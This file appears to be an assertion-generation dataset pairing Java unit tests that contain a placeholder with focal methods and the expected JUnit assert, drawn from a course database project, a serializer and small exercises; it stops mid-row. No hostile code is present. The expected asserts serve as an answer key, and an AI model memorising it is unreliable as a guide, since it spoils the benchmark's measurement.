"""<AssertPlaceHolder>"";
getTupleNumber() { // some code goes here return this.tupleNum; }"	assertEquals(3, hrid.getTupleNumber())
"""<AssertPlaceHolder>"";
hashCode() { // some code goes here int result = 31 * pageId.hashCode() + tupleNum; return result;  }"	assertEquals(hrid.hashCode(), hrid2.hashCode())
"testToAndFromBytes() { for (boolean b : new boolean[] {true, false}) { BoolDataBox d = new BoolDataBox(b); byte[] bytes = d.toBytes(); ""<AssertPlaceHolder>""; } }
toBytes() { byte val = b ? (byte) 1 : (byte) 0; return ByteBuffer.allocate(1).put(val).array(); }"	assertEquals(d, DataBox.fromBytes(ByteBuffer.wrap(bytes), Type.boolType()))
"testType() { ""<AssertPlaceHolder>""; }
type() { return Type.floatType(); }"	assertEquals(Type.floatType(), new FloatDataBox(0f).type())
"testGetFloat() { ""<AssertPlaceHolder>""; }
getFloat() { return this.f; }"	assertEquals(0f, new FloatDataBox(0f).getFloat(), 0.0001)
"testToAndFromBytes() { for (int i = -10; i < 10; ++i) { FloatDataBox d = new FloatDataBox((float) i); byte[] bytes = d.toBytes(); ""<AssertPlaceHolder>""; } }
toBytes() { return ByteBuffer.allocate(Float.BYTES).putFloat(f).array(); }"	assertEquals(d, DataBox.fromBytes(ByteBuffer.wrap(bytes), Type.floatType()))
"testType() { ""<AssertPlaceHolder>""; }
type() { return Type.intType(); }"	assertEquals(Type.intType(), new IntDataBox(0).type())
"testGetInt() { ""<AssertPlaceHolder>""; }
getInt() { return this.i; }"	assertEquals(0, new IntDataBox(0).getInt())
"testToAndFromBytes() { for (int i = -10; i < 10; ++i) { IntDataBox d = new IntDataBox(i); byte[] bytes = d.toBytes(); ""<AssertPlaceHolder>""; } }
toBytes() { return ByteBuffer.allocate(Integer.BYTES).putInt(i).array(); }"	assertEquals(d, DataBox.fromBytes(ByteBuffer.wrap(bytes), Type.intType()))
"testType() { ""<AssertPlaceHolder>""; }
type() { return Type.longType(); }"	assertEquals(Type.longType(), new LongDataBox(0L).type())
"testGetLong() { ""<AssertPlaceHolder>""; }
getLong() { return this.l; }"	assertEquals(0L, new LongDataBox(0L).getLong())
"testToAndFromBytes() { for (long i = -10L; i < 10L; ++i) { LongDataBox d = new LongDataBox(i); byte[] bytes = d.toBytes(); ""<AssertPlaceHolder>""; } }
toBytes() { return ByteBuffer.allocate(Long.BYTES).putLong(l).array(); }"	assertEquals(d, DataBox.fromBytes(ByteBuffer.wrap(bytes), Type.longType()))
"testType() { ""<AssertPlaceHolder>""; }
type() { return Type.stringType(m); }"	"assertEquals(Type.stringType(3), new StringDataBox(""foo"", 3).type())"
"testToAndFromBytes() { for (String s : new String[] {""foo"", ""bar"", ""baz""}) { StringDataBox d = new StringDataBox(s, 3); byte[] bytes = d.toBytes(); ""<AssertPlaceHolder>""; } }
toBytes() { // pad with null bytes String padded = s + new String(new char[m - s.length()]); return padded.getBytes(Charset.forName(""ascii"")); }"	assertEquals(d, DataBox.fromBytes(ByteBuffer.wrap(bytes), Type.stringType(3)))
"testFetchPage() { int partNum = diskSpaceManager.allocPart(1);  BufferFrame frame1 = bufferManager.fetchNewPageFrame(partNum); BufferFrame frame2 = bufferManager.fetchPageFrame(frame1.getPageNum());  frame1.unpin(); frame2.unpin();  ""<AssertPlaceHolder>""; }
unpin() { super.unpin(); this.frameLock.unlock(); }"	assertSame(frame1, frame2)
"testReadWrite() { int partNum = diskSpaceManager.allocPart(1);  byte[] expected = new byte[] { (byte) 0xDE, (byte) 0xAD, (byte) 0xBE, (byte) 0xEF }; byte[] actual = new byte[4];  BufferFrame frame1 = bufferManager.fetchNewPageFrame(partNum); frame1.writeBytes((short) 67, (short) 4, expected); frame1.readBytes((short) 67, (short) 4, actual); frame1.unpin();  ""<AssertPlaceHolder>""; }
unpin() { super.unpin(); this.frameLock.unlock(); }"	assertArrayEquals(expected, actual)
"testAppendFetch() { LogRecord expected = new MasterLogRecord(1234);  logManager.appendToLog(expected); LogRecord record = logManager.fetchLogRecord(0);  ""<AssertPlaceHolder>""; }
fetchLogRecord(long LSN) { try { Page logPage = bufferManager.fetchPage(new DummyLockContext(""_dummyLogPageRecord""), getLSNPage(LSN)); try { Buffer buf = logPage.getBuffer(); buf.position(getLSNIndex(LSN)); Optional<LogRecord> record = LogRecord.fromBytes(buf); record.ifPresent((LogRecord e) -> e.setLSN(LSN)); return record.orElse(null); } finally { logPage.unpin(); } } catch (PageException e) { return null; } }"	assertEquals(expected, record)
"testAppendScan() { LogRecord expected = new MasterLogRecord(1234);  logManager.appendToLog(expected); LogRecord record = logManager.scanFrom(0).next();  ""<AssertPlaceHolder>""; }
next() { if (hasNext()) { final BacktrackingIterator<LogRecord> iter = nextIter; BacktrackingIterable<LogRecord> iterable = () -> iter;  nextIter = null; do { ++nextIndex; try { Page page = bufferManager.fetchPage(new DummyLockContext(), nextIndex); nextIter = new LogPageIterator(page, 0); } catch (PageException e) { break; } } while (!nextIter.hasNext());  return iterable; } throw new NoSuchElementException(); }"	assertEquals(expected, record)
"testAppendIterator() { LogRecord expected = new MasterLogRecord(1234);  logManager.appendToLog(expected); LogRecord record = logManager.iterator().next();  ""<AssertPlaceHolder>""; }
next() { if (hasNext()) { final BacktrackingIterator<LogRecord> iter = nextIter; BacktrackingIterable<LogRecord> iterable = () -> iter;  nextIter = null; do { ++nextIndex; try { Page page = bufferManager.fetchPage(new DummyLockContext(), nextIndex); nextIter = new LogPageIterator(page, 0); } catch (PageException e) { break; } } while (!nextIter.hasNext());  return iterable; } throw new NoSuchElementException(); }"	assertEquals(expected, record)
"testFlushedLSN() { logManager.appendToLog(new MasterLogRecord(1234)); logManager.flushToLSN(9999);  ""<AssertPlaceHolder>""; }
getFlushedLSN() { return flushedLSN; }"	assertEquals(9999, logManager.getFlushedLSN())
"testUpdateFreeSpace() { createPageDirectory((short) 10);  short pageSize = (short) (pageDirectory.getEffectivePageSize() - 10); Page p1 = pageDirectory.getPageWithSpace(pageSize); p1.unpin();  pageDirectory.updateFreeSpace(p1, (short) 10);  Page p2 = pageDirectory.getPageWithSpace((short) 10); p2.unpin();  ""<AssertPlaceHolder>""; }
getPageWithSpace(short requiredSpace) { if (requiredSpace <= 0) { throw new IllegalArgumentException(""cannot request nonpositive amount of space""); } if (requiredSpace > EFFECTIVE_PAGE_SIZE - emptyPageMetadataSize) { throw new IllegalArgumentException(""requesting page with more space than the size of the page""); }  Page page = this.firstHeader.loadPageWithSpace(requiredSpace); LockContext pageContext = lockContext.childContext(page.getPageNum()); // TODO(proj4_part2): Update the following line LockUtil.ensureSufficientLockHeld(pageContext, LockType.NL);  return new DataPage(pageDirectoryId, page); }"	assertEquals(p1, p2)
"testSizeInBytes() { ""<AssertPlaceHolder>""; }
getSizeInBytes() { // See toBytes. return Long.BYTES + Short.BYTES; }"	assertEquals(10, RecordId.getSizeInBytes())
"testToAndFromBytes() { for (int i = 0; i < 10; ++i) { for (short j = 0; j < 10; ++j) { RecordId rid = new RecordId(i, j); ""<AssertPlaceHolder>""; } } }
toBytes() { // A RecordId is serialized as its 8-byte page number followed by its // 2-byte short. return ByteBuffer.allocate(getSizeInBytes()) .putLong(pageNum) .putShort(entryNum) .array(); }"	assertEquals(rid, RecordId.fromBytes(ByteBuffer.wrap(rid.toBytes())))
"testToAndFromBytes() { Schema[] schemas = { // Single column. new Schema().add(""x"", Type.intType()), new Schema().add(""x"", Type.floatType()), new Schema().add(""x"", Type.boolType()), new Schema().add(""x"", Type.stringType(1)), new Schema().add(""x"", Type.stringType(10)),  // Multiple columns. new Schema() .add(""x"", Type.boolType()) .add(""y"", Type.intType()) .add(""z"", Type.floatType()), new Schema() .add(""x"", Type.boolType()) .add(""y"", Type.stringType(42)) };  for (Schema schema : schemas) { ""<AssertPlaceHolder>""; } }
toBytes() { // A schema is serialized as follows. We first write the number of fields // (4 bytes). Then, for each field, we write // //   1. the length of the field name (4 bytes), //   2. the field's name, //   3. and the field's type.  // First, we compute the number of bytes we need to serialize the schema. int size = Integer.BYTES; // The length of the schema. for (int i = 0; i < fieldNames.size(); ++i) { size += Integer.BYTES; // The length of the field name. size += fieldNames.get(i).length(); // The field name. size += fieldTypes.get(i).toBytes().length; // The type. }  // Then we serialize it. ByteBuffer buf = ByteBuffer.allocate(size); buf.putInt(fieldNames.size()); for (int i = 0; i < fieldNames.size(); ++i) { buf.putInt(fieldNames.get(i).length()); buf.put(fieldNames.get(i).getBytes(Charset.forName(""UTF-8""))); buf.put(fieldTypes.get(i).toBytes()); } return buf.array(); }"	assertEquals(schema, Schema.fromBytes(ByteBuffer.wrap(schema.toBytes())))
"testSingleInsertAndGet() { Record r = createRecordWithAllTypes(0); RecordId rid = table.addRecord(r); ""<AssertPlaceHolder>""; }
getRecord(RecordId rid) { validateRecordId(rid); Page page = fetchPage(rid.getPageNum()); try { byte[] bitmap = getBitMap(page); if (Bits.getBit(bitmap, rid.getEntryNum()) == Bits.Bit.ZERO) { String msg = String.format(""Record %s does not exist."", rid); throw new DatabaseException(msg); }  int offset = bitmapSizeInBytes + (rid.getEntryNum() * schema.getSizeInBytes()); Buffer buf = page.getBuffer(); buf.position(offset); return Record.fromBytes(buf, schema); } finally { page.unpin(); } }"	assertEquals(r, table.getRecord(rid))
"testThreePagesOfInserts() { List<RecordId> rids = new ArrayList<>(); for (int i = 0; i < table.getNumRecordsPerPage() * 3; ++i) { Record r = createRecordWithAllTypes(i); rids.add(table.addRecord(r)); }  for (int i = 0; i < table.getNumRecordsPerPage() * 3; ++i) { Record r = createRecordWithAllTypes(i); ""<AssertPlaceHolder>""; } }
getRecord(RecordId rid) { validateRecordId(rid); Page page = fetchPage(rid.getPageNum()); try { byte[] bitmap = getBitMap(page); if (Bits.getBit(bitmap, rid.getEntryNum()) == Bits.Bit.ZERO) { String msg = String.format(""Record %s does not exist."", rid); throw new DatabaseException(msg); }  int offset = bitmapSizeInBytes + (rid.getEntryNum() * schema.getSizeInBytes()); Buffer buf = page.getBuffer(); buf.position(offset); return Record.fromBytes(buf, schema); } finally { page.unpin(); } }"	assertEquals(r, table.getRecord(rids.get(i)))
"testSingleDelete() { Record r = createRecordWithAllTypes(0); RecordId rid = table.addRecord(r); ""<AssertPlaceHolder>""; }
deleteRecord(RecordId rid) { validateRecordId(rid); LockContext pageContext = tableContext.childContext(rid.getPageNum());  // TODO(proj4_part2): Update the following line LockUtil.ensureSufficientLockHeld(pageContext, LockType.NL);  Page page = fetchPage(rid.getPageNum()); try { Record record = getRecord(rid);  byte[] bitmap = getBitMap(page); Bits.setBit(bitmap, rid.getEntryNum(), Bits.Bit.ZERO); writeBitMap(page, bitmap);  stats.get(name).removeRecord(record); int numRecords = numRecordsPerPage == 1 ? 0 : numRecordsOnPage(page); pageDirectory.updateFreeSpace(page, (short) ((numRecordsPerPage - numRecords) * schema.getSizeInBytes())); return record; } finally { page.unpin(); } }"	assertEquals(r, table.deleteRecord(rid))
"testThreePagesOfDeletes() { List<RecordId> rids = new ArrayList<>(); for (int i = 0; i < table.getNumRecordsPerPage() * 3; ++i) { Record r = createRecordWithAllTypes(i); rids.add(table.addRecord(r)); }  for (int i = 0; i < table.getNumRecordsPerPage() * 3; ++i) { Record r = createRecordWithAllTypes(i); ""<AssertPlaceHolder>""; } }
deleteRecord(RecordId rid) { validateRecordId(rid); LockContext pageContext = tableContext.childContext(rid.getPageNum());  // TODO(proj4_part2): Update the following line LockUtil.ensureSufficientLockHeld(pageContext, LockType.NL);  Page page = fetchPage(rid.getPageNum()); try { Record record = getRecord(rid);  byte[] bitmap = getBitMap(page); Bits.setBit(bitmap, rid.getEntryNum(), Bits.Bit.ZERO); writeBitMap(page, bitmap);  stats.get(name).removeRecord(record); int numRecords = numRecordsPerPage == 1 ? 0 : numRecordsOnPage(page); pageDirectory.updateFreeSpace(page, (short) ((numRecordsPerPage - numRecords) * schema.getSizeInBytes())); return record; } finally { page.unpin(); } }"	assertEquals(r, table.deleteRecord(rids.get(i)))
"testReloadTable() { // We add 42 to make sure we have some incomplete pages. int numRecords = table.getNumRecordsPerPage() * 2 + 42;  List<RecordId> rids = new ArrayList<>(); for (int i = 0; i < numRecords; ++i) { Record r = createRecordWithAllTypes(i); rids.add(table.addRecord(r)); }  table = new Table(table.getName(), table.getSchema(), pageDirectory, new DummyLockContext()); for (int i = 0; i < numRecords; ++i) { Record r = createRecordWithAllTypes(i); ""<AssertPlaceHolder>""; } }
getRecord(RecordId rid) { validateRecordId(rid); Page page = fetchPage(rid.getPageNum()); try { byte[] bitmap = getBitMap(page); if (Bits.getBit(bitmap, rid.getEntryNum()) == Bits.Bit.ZERO) { String msg = String.format(""Record %s does not exist."", rid); throw new DatabaseException(msg); }  int offset = bitmapSizeInBytes + (rid.getEntryNum() * schema.getSizeInBytes()); Buffer buf = page.getBuffer(); buf.position(offset); return Record.fromBytes(buf, schema); } finally { page.unpin(); } }"	assertEquals(r, table.getRecord(rids.get(i)))
"testReloadTableThenWriteMoreRecords() { // We add 42 to make sure we have some incomplete pages. int numRecords = table.getNumRecordsPerPage() * 2 + 42;  List<RecordId> rids = new ArrayList<>(); for (int i = 0; i < numRecords; ++i) { Record r = createRecordWithAllTypes(i); rids.add(table.addRecord(r)); }  table = new Table(table.getName(), table.getSchema(), pageDirectory, new DummyLockContext()); for (int i = numRecords; i < 2 * numRecords; ++i) { Record r = createRecordWithAllTypes(i); rids.add(table.addRecord(r)); }  for (int i = 0; i < 2 * numRecords; ++i) { Record r = createRecordWithAllTypes(i); ""<AssertPlaceHolder>""; } }
getRecord(RecordId rid) { validateRecordId(rid); Page page = fetchPage(rid.getPageNum()); try { byte[] bitmap = getBitMap(page); if (Bits.getBit(bitmap, rid.getEntryNum()) == Bits.Bit.ZERO) { String msg = String.format(""Record %s does not exist."", rid); throw new DatabaseException(msg); }  int offset = bitmapSizeInBytes + (rid.getEntryNum() * schema.getSizeInBytes()); Buffer buf = page.getBuffer(); buf.position(offset); return Record.fromBytes(buf, schema); } finally { page.unpin(); } }"	assertEquals(r, table.getRecord(rids.get(i)))
"test02initialQueryReturnsNoConfig() { Result result = execute(new Query(-1)); ""<AssertPlaceHolder>""; }
execute(Command command) { if (command instanceof Join) { Join join = (Join) command;  // Your code here... }  if (command instanceof Leave) { Leave leave = (Leave) command;  // Your code here... }  if (command instanceof Move) { Move move = (Move) command;  // Your code here... }  if (command instanceof Query) { Query query = (Query) command;  // Your code here... }  throw new IllegalArgumentException(); }"	assertEquals(new Error(), result)
"testSmall() { Dog d = new Dog(3); ""<AssertPlaceHolder>""; }
noise() { if (size < 10) { return ""yip""; } return ""bark""; }"	"assertEquals(""yip"", d.noise())"
"testLarge() { Dog d = new Dog(20); ""<AssertPlaceHolder>""; }
noise() { if (size < 10) { return ""yip""; } return ""bark""; }"	"assertEquals(""bark"", d.noise())"
"testTicCalculations() { // Create a GuitarString of frequency 11025, which // is a Deque of length 4. GuitarString s = new GuitarString(11025); s.pluck();  // Record the front four values, ticcing as we go. double s1 = s.sample(); s.tic(); double s2 = s.sample(); s.tic(); double s3 = s.sample(); s.tic(); double s4 = s.sample();  // If we tic once more, it should be equal to 0.996*0.5*(s1 + s2) s.tic();  double s5 = s.sample(); double expected = 0.996 * 0.5 * (s1 + s2);  // Check that new sample is correct, using tolerance of 0.001. // See JUnit documentation for a description of how tolerances work // for ""<AssertPlaceHolder>""; }
sample() { return buffer.get(0); }"	"assertEquals(double, double) assertEquals(""Wrong tic value. Try running the testTic method."", expected, s5, 0.001)"
"IOException { TestingConfig.baseDir = ""bin/test""; TestingConfig test = new TestingConfig(); if (test.exists()) test.getFile().delete();  test.writeAll(); ""<AssertPlaceHolder>""; }
exists() { if (filename() != null && folder() != null) { return conf.exists(); } else return false; }"	assertTrue(test.exists())
"Exception { int integer = rnd.nextInt(); String serialized = ObjectSerializer.serialize(integer); ""<AssertPlaceHolder>""; }
deserialize(String input, Class<T> cls) throws IOException { if (PrimitiveClassUtil.isSupportedPrimitive(cls)) { return (T) PrimitiveClassUtil.getPrimitive(deserialize(input, PrimitiveClassUtil.getWrapperClass(cls))); }  switch (cls.getTypeName()) { case ""java.lang.String"":  if (input.contains(""\\r"")) input = dpMatcher1.reset(input).replaceAll(""$1\r""); input = input.replace(""\\\\r"", ""\\r"");  if (input.contains(""\\b"")) input = dpMatcher2.reset(input).replaceAll(""$1\b""); input = input.replace(""\\\\b"", ""\\b"");  if (input.contains(""\\t"")) input = dpMatcher3.reset(input).replaceAll(""$1\t""); input = input.replace(""\\\\t"", ""\\t"");  if (input.contains(""\\f"")) input = dpMatcher4.reset(input).replaceAll(""$1\f""); input = input.replace(""\\\\f"", ""\\f"");  int index = 0; for (String ch : escapeCharSequences) { if (input.contains(""\"" + ch)) { Matcher matcher = escapeCharMatchers[index]; String chr = escapeChars[index++]; if (input.startsWith(""\"" + ch)) input = input.substring((""\"" + ch).length()) + chr; input = matcher.reset(input).replaceAll(""$1"" + chr); input = input.replace(""\\\"" + ch, ""\"" + ch); } }  input = input.replace(""\'"", ""'""); input = input.replace(""\\\"", ""\"");  return (T) input; case ""java.net.URL"": return (T) new URL(input); case ""java.lang.Boolean"": switch (input.toLowerCase()) { case ""true"": return (T) Boolean.TRUE; case ""false"": return (T) Boolean.FALSE; default: throw new IOException(""Invalid value""); } case ""java.lang.Character"": if (input.length() != 1) throw new IOException(""Invalid value, not a single character""); return (T) Character.valueOf(input.charAt(0)); case ""java.math.BigInteger"": try { return (T) new BigInteger(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.math.BigDecimal"": try { return (T) new BigDecimal(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.util.UUID"": return (T) UUID.fromString(input); default: if (Configuration.class.isAssignableFrom(cls)) { try { Method meth = null; try { meth = cls.getDeclaredMethod(""instanciateFromSerialzer"", Class.class); } catch (NoSuchMethodException e) { try { meth = cls.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e1) { try { meth = Configuration.class.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e2) { } } } meth.setAccessible(true); Configuration<?> outp = (Configuration<?>) meth.invoke(null, cls); return (T) outp.readAll(input); } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | SecurityException e) { throw new IOException(""Could not instantiate the configuration"", e); } } else if (PrimitiveClassUtil.isSupportedWrapper(cls)) { try { Method meth = cls.getMethod(""valueOf"", String.class); meth.setAccessible(true); return (T) meth.invoke(null, input); } catch (IllegalArgumentException | NoSuchMethodException | SecurityException | IllegalAccessException | InvocationTargetException e) { throw new IOException(e); } } else if (cls.isEnum()) { final String info = input; if (Stream.of(cls.getFields()).anyMatch(t -> t.getName().equals(info))) { try { return (T) Stream.of(cls.getFields()).filter(t -> t.getName().equals(info)).findFirst().get() .get(null); } catch (IllegalArgumentException | IllegalAccessException | SecurityException e) { throw new IOException(e); } } else throw new IOException(""No ENUM value "" + input + "" in class "" + cls.getTypeName()); } else if (cls.isArray()) { input = Replacer.removeChar(input, '\r'); String[] lines = input.split(""\n"");  ArrayList<String> inputLst = new ArrayList<String>();  boolean indent = false; boolean quote = false; int array = 0; int brquote = 0;  StringBuilder txt = null;  for (String line : lines) { if (txt != null) txt.append(System.lineSeparator()); if (indent) { for (int i = 0; i < 4; i++) { if (!line.startsWith("" "")) break; line = line.substring(1); } } boolean escape = false; for (int chNum = 0; chNum < line.length(); chNum++) { char ch = line.charAt(chNum); if (!escape) { switch (ch) { case '\': if ((!quote || chNum + 1 < line.length() && line.charAt(chNum + 1) == ''') && array == 0) { escape = true; } if (txt == null) txt = new StringBuilder(); txt.append(ch); break; case ''': if (array == 0) { quote = !quote; if (brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '{': if (!quote && array == 0) { brquote++; indent = true; } else { if (array != 0) brquote++; if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '}': if (!quote) { brquote--; } if (brquote != 0 || quote || array != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } else indent = false; break; case '[': if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } if (!quote) { array++; } break; case ']': if (!quote && array != 0) { array--; } if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case ' ': if (brquote == 0 && !quote && array == 0) { if (txt != null) { inputLst.add(txt.toString()); txt = null; quote = false; } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; default: if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { txt.append(ch); escape = false; } } }  if (txt != null && txt.length() != 0) inputLst.add(txt.toString());  Object data = Array.newInstance(cls.getComponentType(), inputLst.size()); int i = 0; for (String itm : inputLst) Array.set(data, i++, deserialize(itm, cls.getComponentType()));  return (T) data; } throw new IOException(""Unsupported object""); } }"	assertTrue(ObjectSerializer.deserialize(serialized, int.class) == integer)
"Exception { short num = (short) rnd.nextInt(Short.MAX_VALUE); String serialized = ObjectSerializer.serialize(num); ""<AssertPlaceHolder>""; }
deserialize(String input, Class<T> cls) throws IOException { if (PrimitiveClassUtil.isSupportedPrimitive(cls)) { return (T) PrimitiveClassUtil.getPrimitive(deserialize(input, PrimitiveClassUtil.getWrapperClass(cls))); }  switch (cls.getTypeName()) { case ""java.lang.String"":  if (input.contains(""\\r"")) input = dpMatcher1.reset(input).replaceAll(""$1\r""); input = input.replace(""\\\\r"", ""\\r"");  if (input.contains(""\\b"")) input = dpMatcher2.reset(input).replaceAll(""$1\b""); input = input.replace(""\\\\b"", ""\\b"");  if (input.contains(""\\t"")) input = dpMatcher3.reset(input).replaceAll(""$1\t""); input = input.replace(""\\\\t"", ""\\t"");  if (input.contains(""\\f"")) input = dpMatcher4.reset(input).replaceAll(""$1\f""); input = input.replace(""\\\\f"", ""\\f"");  int index = 0; for (String ch : escapeCharSequences) { if (input.contains(""\"" + ch)) { Matcher matcher = escapeCharMatchers[index]; String chr = escapeChars[index++]; if (input.startsWith(""\"" + ch)) input = input.substring((""\"" + ch).length()) + chr; input = matcher.reset(input).replaceAll(""$1"" + chr); input = input.replace(""\\\"" + ch, ""\"" + ch); } }  input = input.replace(""\'"", ""'""); input = input.replace(""\\\"", ""\"");  return (T) input; case ""java.net.URL"": return (T) new URL(input); case ""java.lang.Boolean"": switch (input.toLowerCase()) { case ""true"": return (T) Boolean.TRUE; case ""false"": return (T) Boolean.FALSE; default: throw new IOException(""Invalid value""); } case ""java.lang.Character"": if (input.length() != 1) throw new IOException(""Invalid value, not a single character""); return (T) Character.valueOf(input.charAt(0)); case ""java.math.BigInteger"": try { return (T) new BigInteger(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.math.BigDecimal"": try { return (T) new BigDecimal(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.util.UUID"": return (T) UUID.fromString(input); default: if (Configuration.class.isAssignableFrom(cls)) { try { Method meth = null; try { meth = cls.getDeclaredMethod(""instanciateFromSerialzer"", Class.class); } catch (NoSuchMethodException e) { try { meth = cls.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e1) { try { meth = Configuration.class.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e2) { } } } meth.setAccessible(true); Configuration<?> outp = (Configuration<?>) meth.invoke(null, cls); return (T) outp.readAll(input); } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | SecurityException e) { throw new IOException(""Could not instantiate the configuration"", e); } } else if (PrimitiveClassUtil.isSupportedWrapper(cls)) { try { Method meth = cls.getMethod(""valueOf"", String.class); meth.setAccessible(true); return (T) meth.invoke(null, input); } catch (IllegalArgumentException | NoSuchMethodException | SecurityException | IllegalAccessException | InvocationTargetException e) { throw new IOException(e); } } else if (cls.isEnum()) { final String info = input; if (Stream.of(cls.getFields()).anyMatch(t -> t.getName().equals(info))) { try { return (T) Stream.of(cls.getFields()).filter(t -> t.getName().equals(info)).findFirst().get() .get(null); } catch (IllegalArgumentException | IllegalAccessException | SecurityException e) { throw new IOException(e); } } else throw new IOException(""No ENUM value "" + input + "" in class "" + cls.getTypeName()); } else if (cls.isArray()) { input = Replacer.removeChar(input, '\r'); String[] lines = input.split(""\n"");  ArrayList<String> inputLst = new ArrayList<String>();  boolean indent = false; boolean quote = false; int array = 0; int brquote = 0;  StringBuilder txt = null;  for (String line : lines) { if (txt != null) txt.append(System.lineSeparator()); if (indent) { for (int i = 0; i < 4; i++) { if (!line.startsWith("" "")) break; line = line.substring(1); } } boolean escape = false; for (int chNum = 0; chNum < line.length(); chNum++) { char ch = line.charAt(chNum); if (!escape) { switch (ch) { case '\': if ((!quote || chNum + 1 < line.length() && line.charAt(chNum + 1) == ''') && array == 0) { escape = true; } if (txt == null) txt = new StringBuilder(); txt.append(ch); break; case ''': if (array == 0) { quote = !quote; if (brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '{': if (!quote && array == 0) { brquote++; indent = true; } else { if (array != 0) brquote++; if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case '}': if (!quote) { brquote--; } if (brquote != 0 || quote || array != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } else indent = false; break; case '[': if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } if (!quote) { array++; } break; case ']': if (!quote && array != 0) { array--; } if (array != 0 || quote || brquote != 0) { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; case ' ': if (brquote == 0 && !quote && array == 0) { if (txt != null) { inputLst.add(txt.toString()); txt = null; quote = false; } } else { if (txt == null) txt = new StringBuilder(); txt.append(ch); } break; default: if (txt == null) txt = new StringBuilder(); txt.append(ch); } } else { txt.append(ch); escape = false; } } }  if (txt != null && txt.length() != 0) inputLst.add(txt.toString());  Object data = Array.newInstance(cls.getComponentType(), inputLst.size()); int i = 0; for (String itm : inputLst) Array.set(data, i++, deserialize(itm, cls.getComponentType()));  return (T) data; } throw new IOException(""Unsupported object""); } }"	assertTrue(ObjectSerializer.deserialize(serialized, short.class) == num)
"Exception { long num = rnd.nextLong(); String serialized = ObjectSerializer.serialize(num); ""<AssertPlaceHolder>""; }
deserialize(String input, Class<T> cls) throws IOException { if (PrimitiveClassUtil.isSupportedPrimitive(cls)) { return (T) PrimitiveClassUtil.getPrimitive(deserialize(input, PrimitiveClassUtil.getWrapperClass(cls))); }  switch (cls.getTypeName()) { case ""java.lang.String"":  if (input.contains(""\\r"")) input = dpMatcher1.reset(input).replaceAll(""$1\r""); input = input.replace(""\\\\r"", ""\\r"");  if (input.contains(""\\b"")) input = dpMatcher2.reset(input).replaceAll(""$1\b""); input = input.replace(""\\\\b"", ""\\b"");  if (input.contains(""\\t"")) input = dpMatcher3.reset(input).replaceAll(""$1\t""); input = input.replace(""\\\\t"", ""\\t"");  if (input.contains(""\\f"")) input = dpMatcher4.reset(input).replaceAll(""$1\f""); input = input.replace(""\\\\f"", ""\\f"");  int index = 0; for (String ch : escapeCharSequences) { if (input.contains(""\"" + ch)) { Matcher matcher = escapeCharMatchers[index]; String chr = escapeChars[index++]; if (input.startsWith(""\"" + ch)) input = input.substring((""\"" + ch).length()) + chr; input = matcher.reset(input).replaceAll(""$1"" + chr); input = input.replace(""\\\"" + ch, ""\"" + ch); } }  input = input.replace(""\'"", ""'""); input = input.replace(""\\\"", ""\"");  return (T) input; case ""java.net.URL"": return (T) new URL(input); case ""java.lang.Boolean"": switch (input.toLowerCase()) { case ""true"": return (T) Boolean.TRUE; case ""false"": return (T) Boolean.FALSE; default: throw new IOException(""Invalid value""); } case ""java.lang.Character"": if (input.length() != 1) throw new IOException(""Invalid value, not a single character""); return (T) Character.valueOf(input.charAt(0)); case ""java.math.BigInteger"": try { return (T) new BigInteger(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.math.BigDecimal"": try { return (T) new BigDecimal(input); } catch (NumberFormatException e) { throw new IOException(e); } case ""java.util.UUID"": return (T) UUID.fromString(input); default: if (Configuration.class.isAssignableFrom(cls)) { try { Method meth = null; try { meth = cls.getDeclaredMethod(""instanciateFromSerialzer"", Class.class); } catch (NoSuchMethodException e) { try { meth = cls.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e1) { try { meth = Configuration.class.getDeclaredMethod(""instantiateFromSerializer"", Class.class); } catch (NoSuchMethodException e2) { } } } meth.setAccessible(true); Configuration<?> outp = (Configuration<?>) meth.invoke(null, cls); return (T) outp.readAll(input); } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | SecurityException e) { throw new IOException(""Could not instantiate the configuration"", e); } } else if (PrimitiveClassUtil.isSupportedWrapper(cls)) { try { Method meth = cls.getMethod(""valueOf"", String.class); meth.setAccessible(true); return (T) meth.invoke(null, input); } catch (IllegalArgumentException | NoSuchMethodException | SecurityException | IllegalAccessException | InvocationTargetException e) { throw new IOException(e); } } else if (cls.isEnum()) { final String info = input; if (Stream.of(cls.getFields()).anyMatch(t -> t.getName().equals(info))) { try { return (T) Stream.of(cls.getFields()).filter(t -> t.getName().equals(info)).findFirst().get() .get(null); } catch (IllegalArgumentException | IllegalAccessException | SecurityException e) { throw new IOException(e); } } else throw new IOException(""No ENUM value "" + input + "" in class "" + cls.getTypeName()); } else if (cls.isArray()) { input = Replacer.removeChar(input, '\r'); String[] lines = input.split(""\n"");  ArrayList<String> inputLst = new ArrayList<String>();  boolean indent = false; boolean quote = false; int array = 0; int brquote = 0;  StringBuilder txt = null;  for (String line : lines) { if (txt != null) txt.append(System.lineSeparator()); if (indent) { for (int i = 0; i < 4; i++) { if (!line.startsWith("" "")) break; line = line.substring(1); } 